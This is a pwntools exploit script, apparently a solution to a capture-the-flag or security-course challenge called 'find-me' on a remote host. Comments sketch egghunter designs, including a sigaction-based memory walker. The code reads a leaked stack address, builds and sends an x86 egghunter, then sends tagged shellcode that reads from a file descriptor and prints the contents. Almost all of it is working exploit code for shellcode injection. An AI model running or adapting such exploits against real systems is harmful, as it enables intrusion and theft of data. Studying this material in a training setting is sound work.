from pwn import *

'''
highlevel:
eggfinder:
*egg_addr()

egg:
bytes_read = read(1000, buf, 0xFF);
write(1, buf, bytes_read)

'''
'''
medlevel

push   DWORD PTR [ebp-0x10]

eggfinder:
set eax 0x44434241
set edi stack_addr

incr:
scasd
go to incr if not 0
scasd
go to incr if not 0
jmp edi


egg:

'''
'''
low level:
mov eax, 0x44434241
mov edi, stack_addr
incr: scasd
jnz incr
scasd
jnz incr
jmp edi

inc_addr:
	inc	ecx		;; Move to address+1
	push	0x43		;; sigaction(2) systemcall
	pop	eax		;; classic push-pop technique, not using mov
	int	0x80		;; Interrupt to call sigaction

verify_efault:
	cmp	al, 0xf2	; do we get EFAULT for ecx address?
	jz	inc_page	; zero flag means we got efault in this page. Go to the next page
	
is_egg:
	mov	eax, 0x40414243 ; place identifier in eax
	mov	edi, ecx	; place the address to edi
	scasd			; eax == edi?
	jnz	inc_addr	; not match, go to the next address
	scasd			; eax == [edi+4]?
	jnz	inc_addr	; not match, go to the next address
	jmp	edi		; egg found!, jump to payload
'''

p = remote('plsdonthaq.me', 3003)
#p = process('./find-me')

p.recvuntil('new stack ')

stack_addr = str(p.recvline().rstrip(), 'utf-8')
print(stack_addr)

'''egghunter = b''
egghunter += asm('mov eax, 0x44434241')
egghunter += asm('mov edi, '+stack_addr)
print(len(egghunter))
#egghunter += asm('incr: scasd')
egghunter += asm('jnz incr')
print(len(egghunter))
egghunter += asm('scasd')
egghunter += asm('jnz incr')
print(len(egghunter))
egghunter += asm('jmp edi')'''
egghunter = 'mov eax, 0x44434241'
egghunter += '\nmov edi, '+stack_addr
egghunter += '\nincr:'
egghunter += '\nscasd'
egghunter += '\njnz incr'
egghunter += '\nscasd'
egghunter += '\njnz incr'
egghunter += '\njmp edi'
egghunter = asm(egghunter)

print(len(egghunter), egghunter)

p.sendline(egghunter)

egg = b''
egg += b'\x41\x42\x43\x44'
egg += b'\x41\x42\x43\x44'
egg += b'\xcc\xcc\xcc\xcc'

shellcode = b''
shellcode += b'\x41\x42\x43\x44'
shellcode += b'\x41\x42\x43\x44'
shellcode += asm('xor eax, eax')
shellcode += asm('xor ebx, ebx')
shellcode += asm('xor edx, edx')
shellcode += asm('mov al, 0x3')
shellcode += asm('mov bx, 0x3E8')
shellcode += asm('mov ecx, esp')
shellcode += asm('mov dl, 0xFF')
shellcode += asm('int 0x80')
shellcode += asm('xchg eax, edx')
shellcode += asm('mov al, 0x4')
shellcode += asm('mov bx, 0x1')
shellcode += asm('int 0x80')

p.sendline(shellcode)

p.interactive()
